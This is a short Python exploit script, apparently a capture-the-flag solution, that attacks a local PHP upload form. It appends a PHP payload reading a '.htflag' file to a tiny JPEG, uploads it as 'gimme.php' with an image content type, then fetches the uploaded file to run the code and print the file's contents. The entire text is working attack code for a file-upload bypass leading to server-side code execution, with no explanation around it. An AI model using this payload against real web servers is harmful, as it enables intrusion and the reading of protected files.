from PIL import Image
from io import BytesIO
import requests
import re

img = Image.new('RGB', (1, 1))
imageContent = BytesIO()
img.save(imageContent, format="jpeg")

imageLength = len(imageContent.getvalue())
imageContent.write(b'<?php echo file_get_contents("../.htflag");')

response = requests.post('http://127.0.0.1:8080/index.php',
        files={'uploadedfile': ('gimme.php', imageContent.getvalue(), 'image/jpeg')})

if ' has been uploaded' in response.text:
    path = re.findall(
            r'\[\+\] <a href=\'([^\']+)\'>.*</a> has been uploaded',
            response.text)[0]
    print(f'[+] Injection done: {path}')
    response = requests.get(f'http://127.0.0.1:8080{path}')
    print(f'>>> {response.text[imageLength:]}')
else:
    print("[-] Injection failed")
    print(response.text)
